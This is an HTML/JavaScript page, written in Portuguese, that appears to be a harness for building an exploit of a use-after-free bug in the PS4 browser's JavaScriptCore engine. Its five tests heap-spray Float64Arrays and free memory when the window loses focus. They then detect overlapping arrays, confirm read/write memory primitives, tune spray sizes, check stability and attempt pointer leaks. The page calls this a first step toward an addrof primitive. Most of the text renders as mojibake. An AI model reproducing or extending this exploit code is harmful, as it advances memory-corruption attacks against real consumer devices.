<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Bateria de Testes</title>
<style>
body { 
    font-family: monospace; 
    background: #000; 
    color: #0f0; 
    padding: 20px;
}
.test-box {
    border: 2px solid #0a0;
    padding: 15px;
    margin: 10px 0;
    background: #001100;
}
.success { background: #003300 !important; border-color: #0f0 !important; }
.fail { background: #330000 !important; border-color: #f00 !important; color: #f00; }
.running { background: #333300 !important; border-color: #ff0 !important; }
button {
    background: #0a0;
    color: #000;
    border: none;
    padding: 10px 20px;
    font-size: 16px;
    cursor: pointer;
    margin: 5px;
}
button:hover { background: #0f0; }
#status { font-size: 20px; margin: 20px 0; }
</style>
</head>
<body>

<h1>üî¨ PS4 UAF - Valida√ß√£o de Sobreposi√ß√£o</h1>
<div id="status">Selecione um teste abaixo</div>

<div class="test-box" id="test1">
    <h2>TESTE 1: Padr√£o M√∫ltiplo (Detecta qual √≠ndice sobrep√µe)</h2>
    <p>Usa 3 padr√µes diferentes para identificar EXATAMENTE qual array foi corrompido</p>
    <button onclick="runTest1()">‚ñ∂ Executar Teste 1</button>
    <div id="result1"></div>
</div>

<div class="test-box" id="test2">
    <h2>TESTE 2: Leitura e Escrita (Confirma controle R/W)</h2>
    <p>Tenta ler E escrever no array corrompido para confirmar primitiva de mem√≥ria</p>
    <button onclick="runTest2()">‚ñ∂ Executar Teste 2</button>
    <div id="result2"></div>
</div>

<div class="test-box" id="test3">
    <h2>TESTE 3: Tamanho Vari√°vel (Busca melhor configura√ß√£o)</h2>
    <p>Testa diferentes tamanhos de arrays para achar a configura√ß√£o ideal</p>
    <button onclick="runTest3()">‚ñ∂ Executar Teste 3</button>
    <div id="result3"></div>
</div>

<div class="test-box" id="test4">
    <h2>TESTE 4: Persist√™ncia (Verifica estabilidade)</h2>
    <p>Testa se a sobreposi√ß√£o se mant√©m ap√≥s m√∫ltiplas opera√ß√µes</p>
    <button onclick="runTest4()">‚ñ∂ Executar Teste 4</button>
    <div id="result4"></div>
</div>

<div class="test-box" id="test5">
    <h2>TESTE 5: Leak de Length (Busca metadados do array)</h2>
    <p>Tenta ler o campo 'length' do TypedArray para vazar ponteiros</p>
    <button onclick="runTest5()">‚ñ∂ Executar Teste 5</button>
    <div id="result5"></div>
</div>

<script>
const Status = document.getElementById('status');

// Padr√µes m√°gicos para detectar sobreposi√ß√£o
const PATTERN_A = 2.121995791e-314; // 0x4141414141414141
const PATTERN_B = 2.183176454e-314; // 0x4242424242424242
const PATTERN_C = 2.244357116e-314; // 0x4343434343434343

let global_controllers = [];
let global_targets = [];
let overlap_detected = false;

// ============================================
// TESTE 1: PADR√ÉO M√öLTIPLO
// ============================================
function runTest1() {
    const box = document.getElementById('test1');
    const result = document.getElementById('result1');
    box.className = 'test-box running';
    result.innerHTML = 'Preparando... Aperte OPTIONS quando pronto!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 1 ATIVO - Aperte OPTIONS agora!';
    
    global_controllers = [];
    global_targets = [];
    
    // Criar arrays com marcadores √∫nicos
    for(let i = 0; i < 8000; i++) {
        let ctrl = new Float64Array(16);
        ctrl[0] = i; // ID √∫nico
        ctrl[1] = PATTERN_A; // Padr√£o de refer√™ncia
        global_controllers.push(ctrl);
        
        let target = new Float64Array(16);
        target.fill(1.1);
        global_targets.push(target);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += 'üî• Blur detectado! Liberando targets...<br>';
        global_targets = null;
        
        // Spray com 3 padr√µes diferentes
        let spray1 = [], spray2 = [], spray3 = [];
        for(let i = 0; i < 6000; i++) {
            let p1 = new Float64Array(18);
            p1.fill(PATTERN_A);
            spray1.push(p1);
            
            let p2 = new Float64Array(20);
            p2.fill(PATTERN_B);
            spray2.push(p2);
            
            let p3 = new Float64Array(22);
            p3.fill(PATTERN_C);
            spray3.push(p3);
        }
        
        result.innerHTML += 'üîç Verificando sobreposi√ß√µes...<br>';
        let found_a = 0, found_b = 0, found_c = 0;
        let first_hit = -1;
        
        for(let i = 0; i < global_controllers.length; i++) {
            try {
                const val = global_controllers[i][0];
                if (val === PATTERN_A && global_controllers[i][1] !== PATTERN_A) {
                    found_a++;
                    if (first_hit === -1) first_hit = i;
                }
                if (val === PATTERN_B) found_b++;
                if (val === PATTERN_C) found_c++;
            } catch(e) {}
        }
        
        if (found_a + found_b + found_c > 0) {
            box.className = 'test-box success';
            result.innerHTML += `<br>‚úÖ <b>SUCESSO!</b><br>`;
            result.innerHTML += `Padr√£o A encontrado: ${found_a}x<br>`;
            result.innerHTML += `Padr√£o B encontrado: ${found_b}x<br>`;
            result.innerHTML += `Padr√£o C encontrado: ${found_c}x<br>`;
            result.innerHTML += `Primeiro √≠ndice corrompido: ${first_hit}<br>`;
            Status.innerText = '‚úÖ TESTE 1: Sobreposi√ß√£o CONFIRMADA!';
            overlap_detected = true;
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '<br>‚ùå Nenhuma sobreposi√ß√£o detectada<br>';
            Status.innerText = '‚ùå TESTE 1: Falhou';
        }
    };
}

// ============================================
// TESTE 2: LEITURA E ESCRITA
// ============================================
function runTest2() {
    const box = document.getElementById('test2');
    const result = document.getElementById('result2');
    box.className = 'test-box running';
    result.innerHTML = 'Preparando... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 2 ATIVO - Aperte OPTIONS!';
    
    global_controllers = [];
    global_targets = [];
    
    for(let i = 0; i < 8000; i++) {
        let ctrl = new Float64Array(16);
        ctrl[0] = i * 1.5; // Valor calculado √∫nico
        global_controllers.push(ctrl);
        
        let target = new Float64Array(16);
        target.fill(2.2);
        global_targets.push(target);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += 'üî• Liberando mem√≥ria...<br>';
        global_targets = null;
        
        let spray = [];
        for(let i = 0; i < 10000; i++) {
            let p = new Float64Array(20);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        result.innerHTML += 'üîç Buscando primitiva R/W...<br>';
        let corrupted_idx = -1;
        
        for(let i = 0; i < global_controllers.length; i++) {
            try {
                if (global_controllers[i][0] === PATTERN_A) {
                    corrupted_idx = i;
                    break;
                }
            } catch(e) {}
        }
        
        if (corrupted_idx !== -1) {
            result.innerHTML += `‚úÖ Array corrompido encontrado: Controller[${corrupted_idx}]<br>`;
            
            // TESTE DE ESCRITA
            try {
                global_controllers[corrupted_idx][2] = PATTERN_B;
                const readback = global_controllers[corrupted_idx][2];
                
                if (readback === PATTERN_B) {
                    box.className = 'test-box success';
                    result.innerHTML += `<br>üéØ <b>PRIMITIVA R/W CONFIRMADA!</b><br>`;
                    result.innerHTML += `Escrevemos 0x4242... e lemos de volta com sucesso!<br>`;
                    result.innerHTML += `Voc√™ tem controle de leitura/escrita na mem√≥ria!<br>`;
                    Status.innerText = '‚úÖ TESTE 2: Primitiva R/W FUNCIONAL!';
                } else {
                    box.className = 'test-box fail';
                    result.innerHTML += `‚ùå Escrita falhou (leitura: ${readback.toString(16)})<br>`;
                }
            } catch(e) {
                box.className = 'test-box fail';
                result.innerHTML += `‚ùå Erro ao testar escrita: ${e}<br>`;
            }
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå Nenhum array corrompido encontrado<br>';
            Status.innerText = '‚ùå TESTE 2: Falhou';
        }
    };
}

// ============================================
// TESTE 3: TAMANHO VARI√ÅVEL
// ============================================
function runTest3() {
    const box = document.getElementById('test3');
    const result = document.getElementById('result3');
    box.className = 'test-box running';
    result.innerHTML = 'Testando diferentes tamanhos... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 3 ATIVO - Aperte OPTIONS!';
    
    global_controllers = [];
    const sizes = [8, 12, 16, 20, 24, 32];
    let size_map = [];
    
    for(let i = 0; i < 6000; i++) {
        const size = sizes[i % sizes.length];
        let ctrl = new Float64Array(size);
        ctrl[0] = i;
        ctrl[1] = size; // Armazena o tamanho para an√°lise
        global_controllers.push(ctrl);
        size_map.push(size);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += 'üî• Executando spray vari√°vel...<br>';
        
        let spray = [];
        for(let s of sizes) {
            for(let i = 0; i < 2000; i++) {
                let p = new Float64Array(s + 4);
                p.fill(PATTERN_A);
                spray.push(p);
            }
        }
        
        result.innerHTML += 'üîç Analisando resultados...<br>';
        let size_hits = {};
        sizes.forEach(s => size_hits[s] = 0);
        
        for(let i = 0; i < global_controllers.length; i++) {
            try {
                if (global_controllers[i][0] === PATTERN_A) {
                    const original_size = size_map[i];
                    size_hits[original_size]++;
                }
            } catch(e) {}
        }
        
        let total_hits = Object.values(size_hits).reduce((a,b) => a+b, 0);
        if (total_hits > 0) {
            box.className = 'test-box success';
            result.innerHTML += `<br>‚úÖ <b>Sobreposi√ß√µes por tamanho:</b><br>`;
            for(let s of sizes) {
                result.innerHTML += `Tamanho ${s}: ${size_hits[s]} hits<br>`;
            }
            result.innerHTML += `<br>üí° <b>Dica:</b> Use mais arrays do tamanho com mais hits!<br>`;
            Status.innerText = '‚úÖ TESTE 3: An√°lise completa!';
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå Nenhuma sobreposi√ß√£o detectada<br>';
            Status.innerText = '‚ùå TESTE 3: Falhou';
        }
    };
}

// ============================================
// TESTE 4: PERSIST√äNCIA
// ============================================
function runTest4() {
    const box = document.getElementById('test4');
    const result = document.getElementById('result4');
    box.className = 'test-box running';
    result.innerHTML = 'Preparando teste de persist√™ncia... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 4 ATIVO - Aperte OPTIONS!';
    
    global_controllers = [];
    for(let i = 0; i < 8000; i++) {
        let ctrl = new Float64Array(16);
        ctrl[0] = i;
        global_controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += 'üî• Tentando criar sobreposi√ß√£o...<br>';
        
        let spray = [];
        for(let i = 0; i < 10000; i++) {
            let p = new Float64Array(20);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        let corrupted = -1;
        for(let i = 0; i < global_controllers.length; i++) {
            if (global_controllers[i][0] === PATTERN_A) {
                corrupted = i;
                break;
            }
        }
        
        if (corrupted !== -1) {
            result.innerHTML += `‚úÖ Sobreposi√ß√£o inicial: Controller[${corrupted}]<br>`;
            
            // TESTE DE PERSIST√äNCIA
            result.innerHTML += '‚è≥ Testando persist√™ncia por 5 opera√ß√µes...<br>';
            let persistent = true;
            
            for(let test = 0; test < 5; test++) {
                try {
                    global_controllers[corrupted][3] = PATTERN_B;
                    if (global_controllers[corrupted][3] !== PATTERN_B) {
                        persistent = false;
                        result.innerHTML += `‚ùå Falhou na opera√ß√£o ${test + 1}<br>`;
                        break;
                    }
                    result.innerHTML += `‚úì Opera√ß√£o ${test + 1}: OK<br>`;
                } catch(e) {
                    persistent = false;
                    result.innerHTML += `‚ùå Erro na opera√ß√£o ${test + 1}: ${e}<br>`;
                    break;
                }
            }
            
            if (persistent) {
                box.className = 'test-box success';
                result.innerHTML += `<br>üéØ <b>SOBREPOSI√á√ÉO PERSISTENTE!</b><br>`;
                result.innerHTML += `A primitiva √© est√°vel e pode ser usada para exploit!<br>`;
                Status.innerText = '‚úÖ TESTE 4: Primitiva EST√ÅVEL!';
            } else {
                box.className = 'test-box fail';
                result.innerHTML += '<br>‚ö†Ô∏è Sobreposi√ß√£o inst√°vel<br>';
                Status.innerText = '‚ö†Ô∏è TESTE 4: Inst√°vel';
            }
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå Nenhuma sobreposi√ß√£o inicial<br>';
            Status.innerText = '‚ùå TESTE 4: Falhou';
        }
    };
}

// ============================================
// TESTE 5: LEAK DE LENGTH
// ============================================
function runTest5() {
    const box = document.getElementById('test5');
    const result = document.getElementById('result5');
    box.className = 'test-box running';
    result.innerHTML = 'Preparando leak de metadados... Aperte OPTIONS!<br>';
    Status.innerText = '‚ö†Ô∏è TESTE 5 ATIVO - Aperte OPTIONS!';
    
    global_controllers = [];
    for(let i = 0; i < 8000; i++) {
        let ctrl = new Float64Array(16);
        ctrl[0] = i;
        global_controllers.push(ctrl);
    }
    
    const doc = document.documentElement;
    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
    
    window.onblur = function() {
        result.innerHTML += 'üî• Executando...<br>';
        
        let spray = [];
        for(let i = 0; i < 10000; i++) {
            let p = new Float64Array(20);
            p.fill(PATTERN_A);
            spray.push(p);
        }
        
        let corrupted = -1;
        for(let i = 0; i < global_controllers.length; i++) {
            if (global_controllers[i][0] === PATTERN_A) {
                corrupted = i;
                break;
            }
        }
        
        if (corrupted !== -1) {
            result.innerHTML += `‚úÖ Array corrompido: Controller[${corrupted}]<br><br>`;
            
            // Tentar ler al√©m do tamanho original
            result.innerHTML += 'üîç Tentando ler metadados al√©m do array...<br>';
            let leaked_values = [];
            
            for(let offset = 0; offset < 32; offset++) {
                try {
                    const val = global_controllers[corrupted][offset];
                    if (val !== PATTERN_A && val !== 0 && !isNaN(val)) {
                        leaked_values.push({offset: offset, value: val});
                        result.innerHTML += `  [${offset}]: ${val.toString(16)}<br>`;
                    }
                } catch(e) {}
            }
            
            if (leaked_values.length > 0) {
                box.className = 'test-box success';
                result.innerHTML += `<br>üéØ <b>LEAK DE MEM√ìRIA DETECTADO!</b><br>`;
                result.innerHTML += `Encontrados ${leaked_values.length} valores n√£o-padr√£o<br>`;
                result.innerHTML += `Estes podem ser ponteiros ou metadados do JSC!<br>`;
                Status.innerText = '‚úÖ TESTE 5: LEAK detectado!';
            } else {
                box.className = 'test-box fail';
                result.innerHTML += '<br>‚ùå Nenhum dado vazado<br>';
                Status.innerText = '‚ùå TESTE 5: Sem leak';
            }
        } else {
            box.className = 'test-box fail';
            result.innerHTML += '‚ùå Nenhuma sobreposi√ß√£o<br>';
            Status.innerText = '‚ùå TESTE 5: Falhou';
        }
    };
}

</script>

<hr>
<p style="color: #888;">
üí° <b>DICAS:</b><br>
‚Ä¢ Se o TESTE 1 e 2 passarem, voc√™ tem uma primitiva R/W funcional!<br>
‚Ä¢ O TESTE 3 ajuda a otimizar os tamanhos dos arrays<br>
‚Ä¢ O TESTE 4 confirma que a sobreposi√ß√£o √© est√°vel<br>
‚Ä¢ O TESTE 5 tenta vazar ponteiros (primeiro passo para addrof)<br>
‚Ä¢ O crash no ATUALIZAR indica UAF no teardown (bom sinal!)<br>
</p>

</body>
</html>
